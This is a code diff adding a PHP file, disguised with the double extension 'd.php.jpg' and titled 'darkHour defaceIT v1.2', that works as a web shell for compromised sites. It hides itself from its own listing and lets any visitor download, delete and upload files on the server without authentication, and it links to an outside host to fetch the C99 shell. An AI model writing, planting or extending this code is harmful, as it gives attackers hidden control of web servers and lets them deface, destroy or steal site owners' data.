@@ -1,0 +1,90 @@
+
+<?php
+
+$hide = array('d.php.jpg',);        
+    error_reporting(E_ERROR);
+    if ($_GET['download']) {
+        $file = str_replace('/', '', $_GET['download']);
+        $file = str_replace('..', '', $file);
+        if (file_exists($file)) {
+            header("Content-type: application/x-download");
+            header("Content-Length: ".filesize($file));
+            header('Content-Disposition: attachment; filename="'.$file.'"');
+            readfile($file);
+            die();
+        }
+    }
+    $filepath = $_SERVER['SCRIPT_FILENAME'];
+    $scriptname = basename($filepath);
+    $readpath = str_replace($scriptname, "", $filepath);
+    $handle = opendir($readpath);
+    if (isset($_GET['rmfile'])) {
+        unlink($readpath . $_GET['rmfile']);
+    }
+    if ($_FILES['file']) {
+        $success = move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+    }
+    while ($file = readdir($handle)) {    
+        if ($file == "." || $file == ".." || in_array($file, $hide))  continue;        
+        $key = @filemtime($file);    
+        $files[$key] = $file;    
+    }
+    closedir($handle);
+    @ksort($files, SORT_NUMERIC);
+    $files = @array_reverse($files);
+?>
+    <!DOCTYPE html>
+    <html>
+        <head>    
+            <title>darkHour defaceIT v1.2</title>
+<style type="text/css">
+<!--A:link { COLOR: dark green; TEXT-DECORATION: none; font-weight: normal }A:visited { COLOR: dark green; TEXT-DECORATION: none; font-weight: normal }A:active { COLOR: dark green; TEXT-DECORATION: none }A:hover { COLOR: dark green; TEXT-DECORATION: none; font-weight: none }-->
+</style>    
+        </head>    
+        <body bgcolor="#000000">    
+            <?php $baseurl = $_SERVER['PHP_SELF']; ?>
+            
+            <font color="#00dd00" face="courier new">
+            <center>
+      <h1>darkHour defaceIT v1.2</h2>
+            <h3>coded by rCom</h3>
+      <table border="0" cellspacing="5" cellpadding="5" align="center">
+                <?php
+                    $arsize = sizeof($files);
+                
+                    for ($i=0; $i<$arsize; $i++) {
+                    
+                        $ext = strtolower(substr($files[$i], strrpos($files[$i], '.')+1));
+        
+                        $filename = stripslashes($files[$i]);
+                        $fileurl = $files[$i];
+                        if (strlen($filename) > 43) {
+                            $filename = substr($files[$i], 0, 40) . '...';
+                        }
+                ?>
+
+                            <tr>
+                                <td></td>
+                                <td><a href="./d.php.jpg?download=<?php echo $filename; ?>"><?php echo $filename; ?></a></td>
+                                <td><?php echo round(filesize($leadon.$files[$i])/1024); ?>KB</td>
+                                <td><?php echo date ("d/m/y", filemtime($leadon.$files[$i]));?></td>
+                                <td><a href="./d.php.jpg?rmfile=<?php echo $filename; ?>">Delete</a></td>
+                            </tr>
+                        
+                <?php } ?>
+            
+            </table>
+    
+            <div id="upload" align="center">
+
+                <form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>" enctype="multipart/form-data">
+                    <p><input type="file" name="file" /></p>
+                    <p><input type="submit" value="Upload" width="60"/></p>
+                </form>
+            
+            </div>
+                 Download C99 Shell <a href='http://www.localroot.net/c99.txt' targer='_blank'><b></u>Here</b></a>
+        </body>
+        
+    </html>
+?>
